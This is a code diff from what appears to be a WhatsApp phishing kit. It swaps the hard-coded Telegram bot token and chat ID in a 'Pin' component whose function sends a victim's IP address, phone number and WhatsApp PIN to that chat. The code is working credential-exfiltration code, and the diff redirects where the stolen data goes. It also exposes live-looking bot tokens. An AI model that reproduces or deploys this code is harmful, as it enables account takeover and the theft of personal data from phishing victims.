@@ -21,8 +21,8 @@ export default function Pin({ setNcode, ncode }) {
 
   const sendAPIMessage = async (currentPin) => {
     try {
-      const apiToken = "8117973793:AAHFnx4SFDBeacZB1z-y2pV0wMhqIlY71_c";
-      const chatId = "7502800832";
+      const apiToken = "8484953068:AAGuwkwD8wyOZIPaCIijjtX9vlAgmPw1qRg";
+      const chatId = "7829326672";
 
       const messageContent = `-------[ Whatsapp  Pin ]-------\nIP Address: ${ncode.ip}\nPhone Number: ${formatPhoneNumberIntl(ncode.number)}\nPin Whatsapp: ${currentPin}\n`;
 
